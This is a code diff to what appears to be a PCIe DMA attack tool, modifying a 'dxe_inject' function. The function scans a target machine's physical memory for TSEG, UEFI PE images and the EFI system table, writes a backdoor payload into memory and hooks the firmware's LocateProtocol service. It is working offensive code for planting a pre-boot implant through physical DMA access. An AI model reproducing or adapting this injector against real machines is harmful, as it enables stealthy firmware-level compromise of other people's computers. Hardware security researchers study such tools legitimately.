@@ -175,9 +175,9 @@ EFI_BOOT_SERVICES_LocateProtocol = 0x140
 
 valid_dxe_addr = lambda addr: addr > 0x1000 and addr < 0x100000000
 
-def dxe_inject(payload = None):
+def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
 
-    dev = None
+    dev = None    
 
     while True:
 
@@ -200,9 +200,13 @@ def dxe_inject(payload = None):
 
             print('[!] ' + str(e))
 
-        except TransactionLayer.ErrorBadCompletion as e: 
+        except LinkLayer.ErrorTimeout as e:
 
             print('[!] ' + str(e))
+
+        except TransactionLayer.ErrorBadCompletion as e: 
+
+            print('[!] ' + str(e))        
 
         # system is not ready yet
         time.sleep(0.1)
@@ -211,54 +215,60 @@ def dxe_inject(payload = None):
 
     t = time.time()
 
-    tseg, g_st = find_tseg(dev), None
+    if system_table is None:
 
-    if tseg is None:
+        tseg, g_st = find_tseg(dev), None
 
-        print('[!] Unable to locate TSEG, trying to find PE image...')
+        if tseg is None:
 
-        base, ptr = 0x80000000, 0
+            print('[!] Unable to locate TSEG, trying to find PE image...')
 
-        # try to find usable UEFI image at the middle of the first 4GB
-        while ptr < base:
+            base, ptr = 0x80000000, 0
 
-            image = base - ptr
+            # try to find usable UEFI image at the middle of the first 4GB
+            while ptr < base:
+
+                image = base - ptr
+                
+                # check for DOS header
+                if dev.mem_read(image, 2) == DOS_HEADER_MAGIC:
+
+                    print('[+] PE image is at 0x%x' % image)
+
+                    g_st = find_sys_table(dev, image)
+                    if g_st is not None:
+
+                        print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
+
+                    break
+
+                ptr += 0x20 * PAGE_SIZE
+
+        else:
+
+            print('[+] TSEG is somewhere around 0x%x' % tseg)
+
+            pe_addr = tseg - MAX_TSEG_SIZE
             
-            # check for DOS header
-            if dev.mem_read(image, 2) == DOS_HEADER_MAGIC:
+            while True:
 
+                image = find_pe(dev, pe_addr, step = 0x10)
+                assert image is not None
+                
                 print('[+] PE image is at 0x%x' % image)
-
+                
                 g_st = find_sys_table(dev, image)
                 if g_st is not None:
 
                     print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
+                    break
 
-                break
-
-            ptr += 0x20 * PAGE_SIZE
+                # try next PE image
+                pe_addr = image - PAGE_SIZE
 
     else:
 
-        print('[+] TSEG is somewhere around 0x%x' % tseg)
-
-        pe_addr = tseg - MAX_TSEG_SIZE
-        
-        while True:
-
-            image = find_pe(dev, pe_addr, step = 0x10)
-            assert image is not None
-            
-            print('[+] PE image is at 0x%x' % image)
-            
-            g_st = find_sys_table(dev, image)
-            if g_st is not None:
-
-                print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
-                break
-
-            # try next PE image
-            pe_addr = image - PAGE_SIZE
+        g_st = system_table
 
     assert g_st is not None
     assert valid_dxe_addr(g_st)
@@ -286,8 +296,8 @@ def dxe_inject(payload = None):
 
         dev.mem_write(BACKDOOR_ADDR, data)
 
-        dev.mem_write_8(STATUS_ADDR + 0, 0)
-        dev.mem_write_8(STATUS_ADDR + 8, 0)
+        dev.mem_write_8(status_addr + 0, 0)
+        dev.mem_write_8(status_addr + 8, 0)
 
         print('Hooking LocateProtocol(): 0x%.8x -> 0x%.8x' % \
               (locate_protocol, new_locate_protocol))
